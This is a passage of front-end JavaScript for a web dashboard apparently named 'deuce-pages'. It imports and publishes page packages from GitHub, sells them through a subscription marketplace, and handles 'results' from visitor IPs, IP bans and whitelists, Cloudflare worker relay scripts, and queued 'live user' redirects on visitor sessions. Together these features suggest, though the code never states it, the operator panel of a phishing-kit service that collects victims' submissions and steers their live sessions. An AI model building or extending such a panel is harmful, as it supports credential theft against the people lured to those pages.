        `;
      }
      statusText.textContent = connection.status === 403 ? "ADMIN ACCESS REQUIRED" : "GITHUB IMPORT NEEDS API CONNECTION";
      if (connection.status === 401) window.location.hash = "#login";
      return;
    }

    if (resultPanel) {
      resultPanel.innerHTML = `
        <code>API online: ${escapeHtml(connection.health?.service || "deuce-pages-api")}</code>
        <code>Admin verified: ${escapeHtml(connection.user?.email || "current session")}</code>
        <code>Connecting to GitHub: ${escapeHtml(payload.repoUrl)}</code>
      `;
    }
    if (triggerButton) {
      triggerButton.textContent = mode === "publish" ? "Publishing..." : createPackageRecord ? "Creating..." : "Scanning...";
    }
    statusText.textContent = mode === "publish" ? "IMPORTING AND PUBLISHING PACKAGE" : createPackageRecord ? "CREATING GITHUB PACKAGE DRAFT" : "SCANNING GITHUB REPOSITORY";

    const result = await requestApi(endpoint, {
      method: "POST",
      body: JSON.stringify(payload)
    });
    renderGithubImportResult(result.scan, result.package);
    if (result.package) await loadAppData();
    statusText.textContent = mode === "publish" ? "GITHUB PACKAGE PUBLISHED" : createPackageRecord ? "GITHUB PACKAGE DRAFT CREATED" : "GITHUB REPOSITORY SCANNED";
  } catch (error) {
    if (resultPanel) {
      resultPanel.innerHTML = `
        <code>GitHub import failed</code>
        <code>${escapeHtml(error.message)}</code>
        <code>Private repos need valid GitHub access. Public repos need the correct branch and folder.</code>
      `;
    }
    statusText.textContent = error.status === 401
      ? "LOGIN REQUIRED"
      : error.status === 403
        ? "ADMIN ACCESS REQUIRED"
        : error.status === 0
          ? "GITHUB IMPORT NEEDS API CONNECTION"
          : "GITHUB IMPORT FAILED";
  } finally {
    if (triggerButton) {
      triggerButton.disabled = false;
      triggerButton.textContent = originalLabel;
    }
  }
}

function sizeMatrix() {
  matrix.width = window.innerWidth * window.devicePixelRatio;
  matrix.height = window.innerHeight * window.devicePixelRatio;
  context.setTransform(window.devicePixelRatio, 0, 0, window.devicePixelRatio, 0, 0);
}

const glyphs = "0123456789ABCDEFx:/[]{}";
let streams = [];

function resetStreams() {
  const columns = Math.ceil(window.innerWidth / 22);
  streams = Array.from({ length: columns }, () => ({
    y: Math.random() * -120,
    speed: 0.35 + Math.random() * 0.9,
    opacity: 0.18 + Math.random() * 0.38
  }));
}

function drawMatrix() {
  context.fillStyle = "rgba(2, 3, 3, 0.18)";
  context.fillRect(0, 0, window.innerWidth, window.innerHeight);
  context.font = "12px Consolas, monospace";

  streams.forEach((stream, index) => {
    const text = glyphs[Math.floor(Math.random() * glyphs.length)];
    const accent = getComputedStyle(document.documentElement).getPropertyValue("--accent").trim();
    context.fillStyle = `${accent}${Math.round(stream.opacity * 255).toString(16).padStart(2, "0")}`;
    context.fillText(text, index * 22, stream.y * 18);
    stream.y = stream.y * 18 > window.innerHeight && Math.random() > 0.965 ? 0 : stream.y + stream.speed;
  });

  requestAnimationFrame(drawMatrix);
}

window.addEventListener("resize", () => {
  sizeMatrix();
  resetStreams();
});

sizeMatrix();
resetStreams();
drawMatrix();
renderButtons();
applyAppearancePreference();
async function initApp() {
  statusText.textContent = "LOADING API DATA";
  syncAdminVisibility();
  await refreshAuthUser();
  await loadAppData();
  syncAdminVisibility();
  renderRoute();
}

initApp();
window.addEventListener("hashchange", renderRoute);

preview.addEventListener("change", (event) => {
  const marketPlanSelect = event.target.closest("[data-market-plan]");
  if (marketPlanSelect) {
    updateMarketPlanCard(marketPlanSelect);
    return;
  }
});

preview.addEventListener("click", async (event) => {
  const logoutButton = event.target.closest("[data-logout]");
  if (logoutButton) {
    await handleLogout();
    return;
  }

  const routeButton = event.target.closest("[data-route]");
  if (routeButton) {
    window.location.hash = routeButton.dataset.route;
    return;
  }

  const loginSubmitButton = event.target.closest("[data-login-submit]");
  if (loginSubmitButton) {
    await handleLogin();
    return;
  }

  const signupSubmitButton = event.target.closest("[data-signup-submit]");
  if (signupSubmitButton) {
    await handleSignup();
    return;
  }

  const githubScanButton = event.target.closest("[data-github-scan]");
  if (githubScanButton) {
    await scanGithubImport("scan", githubScanButton);
    return;
  }

  const githubImportButton = event.target.closest("[data-github-import]");
  if (githubImportButton) {
    await scanGithubImport("draft", githubImportButton);
    return;
  }

  const githubPublishButton = event.target.closest("[data-github-publish]");
  if (githubPublishButton) {
    await scanGithubImport("publish", githubPublishButton);
    return;
  }

  const marketPreviewButton = event.target.closest("[data-market-preview]");
  if (marketPreviewButton) {
    const pagePackage = marketPages.find((item) => item.slug === marketPreviewButton.dataset.marketPreview);
    const previewUrl = pagePackage ? packagePreviewUrl(pagePackage) : "";
    if (!previewUrl) {
      statusText.textContent = "PACKAGE PREVIEW NOT AVAILABLE";
      return;
    }
    window.open(previewUrl, "_blank", "noopener");
    statusText.textContent = `${pagePackage.name.toUpperCase()} PREVIEW OPENED`;
    return;
  }

  const marketSubscribeButton = event.target.closest("[data-market-subscribe]");
  if (marketSubscribeButton) {
    await subscribeToMarketPackage(marketSubscribeButton);
    return;
  }

  const githubPreviewButton = event.target.closest("[data-github-preview-url]");
  if (githubPreviewButton) {
    const frame = preview.querySelector("[data-github-preview-frame]");
    const title = preview.querySelector("[data-github-preview-title]");
    const openLink = preview.querySelector("[data-github-preview-open]");
    const nextUrl = githubPreviewButton.dataset.githubPreviewUrl;
    const rawUrl = githubPreviewButton.dataset.githubRawUrl || nextUrl;
    if (frame && nextUrl) frame.src = nextUrl;
    if (title) title.textContent = `Previewing ${githubPreviewButton.dataset.githubPreviewName || "screen"}`;
    if (openLink && rawUrl) openLink.href = rawUrl;
    preview.querySelectorAll("[data-github-preview-url]").forEach((button) => button.classList.remove("active"));
    githubPreviewButton.classList.add("active");
    statusText.textContent = "GITHUB SCREEN PREVIEW UPDATED";
    return;
  }

  const adminActionButton = event.target.closest("[data-admin-action]");
  if (adminActionButton) {
    statusText.textContent = adminActionButton.dataset.adminAction;
    return;
  }

  const configButton = event.target.closest("[data-config-page]");
  if (configButton) {
    window.location.hash = `config-${configButton.dataset.configPage}`;
    return;
  }

  const goLiveButton = event.target.closest("[data-go-live]");
  if (goLiveButton) {
    window.location.hash = `go-live-${goLiveButton.dataset.goLive}`;
    return;
  }

  const securityButton = event.target.closest("[data-security]");
  if (securityButton) {
    window.location.hash = `security-${securityButton.dataset.security}:${securityButton.dataset.securityTab}`;
    return;
  }

  const resultsButton = event.target.closest("[data-results]");
  if (resultsButton) {
    window.location.hash = `results-${resultsButton.dataset.results}`;
    return;
  }

  const downloadButton = event.target.closest("[data-download-index]");
  if (downloadButton) {
    downloadGeneratedIndex(getPageBySlug(downloadButton.dataset.downloadIndex));
    return;
  }

  const saveSecurityButton = event.target.closest("[data-save-security]");
  if (saveSecurityButton) {
    saveSecurityConfig(getPageBySlug(saveSecurityButton.dataset.saveSecurity));
    return;
  }

  const saveUserConfigButton = event.target.closest("[data-save-user-config]");
  if (saveUserConfigButton) {
    saveUserConfig(getPageBySlug(saveUserConfigButton.dataset.saveUserConfig));
    return;
  }

  const saveHostingButton = event.target.closest("[data-save-hosting]");
  if (saveHostingButton) {
    saveHostingConfig(getPageBySlug(saveHostingButton.dataset.saveHosting));
    return;
  }

  const verifyHostingButton = event.target.closest("[data-verify-hosting]");
  if (verifyHostingButton) {
    saveHostingConfig(getPageBySlug(verifyHostingButton.dataset.verifyHosting), true);
    return;
  }

  const relaySecretButton = event.target.closest("[data-generate-relay-secret]");
  if (relaySecretButton) {
    generateRelaySecretForPage(getPageBySlug(relaySecretButton.dataset.generateRelaySecret));
    return;
  }

  const copyWorkerButton = event.target.closest("[data-copy-worker]");
  if (copyWorkerButton) {
    const workerCode = preview.querySelector(`[data-worker-code="${copyWorkerButton.dataset.copyWorker}"]`);
    if (!workerCode) {
      statusText.textContent = "WORKER SCRIPT NOT FOUND";
      return;
    }
    await navigator.clipboard.writeText(workerCode.value);
    statusText.textContent = "CLOUDFLARE WORKER SCRIPT COPIED";
    return;
  }

  const verifyCloudflareButton = event.target.closest("[data-verify-cloudflare]");
  if (verifyCloudflareButton) {
    await verifyCloudflareForPage(getPageBySlug(verifyCloudflareButton.dataset.verifyCloudflare));
    return;
  }

  const installCloudflareButton = event.target.closest("[data-install-cloudflare]");
  if (installCloudflareButton) {
    await installCloudflareForPage(getPageBySlug(installCloudflareButton.dataset.installCloudflare));
    return;
  }

  const trafficIpAction = event.target.closest("[data-traffic-ban-ip], [data-traffic-whitelist-ip]");
  if (trafficIpAction) {
    const resultPage = getPageBySlug(trafficIpAction.dataset.trafficPage);
    const ip = trafficIpAction.dataset.trafficBanIp || trafficIpAction.dataset.trafficWhitelistIp || "";
    if (!resultPage || !ip) {
      statusText.textContent = "TRAFFIC IP REQUIRED";
      return;
    }
    const isBan = Boolean(trafficIpAction.dataset.trafficBanIp);
    try {
      const updated = await requestApi(`/api/user-pages/${resultPage.id}/${isBan ? "ban-ip" : "whitelist-ip"}`, {
        method: "POST",
        body: JSON.stringify({ ip })
      });
      resultPage.securityConfig = updated.securityConfig || resultPage.securityConfig;
      ownedPages = ownedPages.map((item) => item.id === resultPage.id ? { ...item, securityConfig: resultPage.securityConfig } : item);
      await renderSecurityCenter(resultPage.slug, "traffic");
      statusText.textContent = isBan ? `${ip} BANNED` : `${ip} WHITELISTED`;
    } catch (error) {
      statusText.textContent = `IP ACTION FAILED: ${error.message}`.toUpperCase();
    }
    return;
  }

  const sessionRedirectButton = event.target.closest("[data-session-redirect]");
  if (sessionRedirectButton) {
    const resultPage = getPageBySlug(sessionRedirectButton.dataset.sessionPage);
    const sessionId = sessionRedirectButton.dataset.sessionRedirect;
    const targetField = [...preview.querySelectorAll("[data-session-target]")]
      .find((field) => field.dataset.sessionTarget === sessionId);
    const targetUrl = targetField?.value.trim() || "";
    if (!resultPage || !targetUrl) {
      statusText.textContent = "REDIRECT TARGET REQUIRED";
      return;
    }
    try {
      const result = await requestApi(`/api/user-pages/${resultPage.id}/sessions/${encodeURIComponent(sessionId)}/redirect`, {
        method: "POST",
        body: JSON.stringify({ targetUrl })
      });
      const updated = normalizeUserPage(result.userPage);
      ownedPages = ownedPages.map((item) => item.id === updated.id ? { ...item, ...updated } : item);
      await renderResultsCenter(updated.slug);
      statusText.textContent = "LIVE USER REDIRECT QUEUED";
    } catch (error) {
      statusText.textContent = `REDIRECT FAILED: ${error.message}`.toUpperCase();
    }
    return;
  }

  const sessionClearButton = event.target.closest("[data-session-clear]");
  if (sessionClearButton) {
    const resultPage = getPageBySlug(sessionClearButton.dataset.sessionPage);
    const sessionId = sessionClearButton.dataset.sessionClear;
    if (!resultPage) return;
    try {
      const result = await requestApi(`/api/user-pages/${resultPage.id}/sessions/${encodeURIComponent(sessionId)}/command`, {
        method: "DELETE"
      });
      const updated = normalizeUserPage(result.userPage);
      ownedPages = ownedPages.map((item) => item.id === updated.id ? { ...item, ...updated } : item);
      await renderResultsCenter(updated.slug);
      statusText.textContent = "LIVE USER COMMAND CLEARED";
    } catch (error) {
      statusText.textContent = `CLEAR FAILED: ${error.message}`.toUpperCase();
    }
    return;
  }

  const resultAction = event.target.closest("[data-result-page]");
  if (resultAction) {
    const resultPage = getPageBySlug(resultAction.dataset.resultPage);
    const resultId = resultAction.dataset.viewResult || resultAction.dataset.deleteResult || resultAction.dataset.banResultIp || resultAction.dataset.whitelistResultIp;
    const result = (resultPage.results || []).find((item) => item.id === resultId);
    if (!result) return;

    if (resultAction.dataset.viewResult) {
      statusText.textContent = `${resultPage.name.toUpperCase()} RESULT FROM ${result.ip} SELECTED`;
      return;
    }

    if (resultAction.dataset.deleteResult) {
      await requestApi(`/api/user-pages/${resultPage.id}/results/${encodeURIComponent(result.id)}`, { method: "DELETE" });
      resultPage.results = resultPage.results.filter((item) => item.id !== result.id);
      await renderResultsCenter(resultPage.slug);
      statusText.textContent = "RESULT DELETED";
      return;
    }

    if (resultAction.dataset.banResultIp) {
      const updated = await requestApi(`/api/user-pages/${resultPage.id}/ban-ip`, {
        method: "POST",
        body: JSON.stringify({ ip: result.ip })
      });
      resultPage.securityConfig = updated.securityConfig || resultPage.securityConfig;
      await renderResultsCenter(resultPage.slug);
      statusText.textContent = `${result.ip} BANNED`;
      return;
    }

    if (resultAction.dataset.whitelistResultIp) {
      const updated = await requestApi(`/api/user-pages/${resultPage.id}/whitelist-ip`, {
        method: "POST",
        body: JSON.stringify({ ip: result.ip })
      });
      resultPage.securityConfig = updated.securityConfig || resultPage.securityConfig;
      await renderResultsCenter(resultPage.slug);
      statusText.textContent = `${result.ip} WHITELISTED`;
      return;
    }
  }

});
